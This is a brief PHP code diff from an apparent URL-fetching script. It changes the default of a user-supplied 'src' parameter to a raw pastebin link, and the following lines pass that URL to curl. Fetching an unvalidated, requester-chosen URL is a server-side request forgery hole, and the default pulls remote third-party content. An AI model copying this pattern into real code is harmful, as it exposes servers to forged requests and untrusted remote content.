@@ -1,5 +1,5 @@
 <?php 
-      $url = (isset($_GET['src']) ? $_GET['src'] : return;);
+      $url = (isset($_GET['src']) ? $_GET['src'] : 'https://pastebin.com/raw/SEGFy1Aa');
 
       $ch = curl_init();
       curl_setopt($ch, CURLOPT_URL, $url);
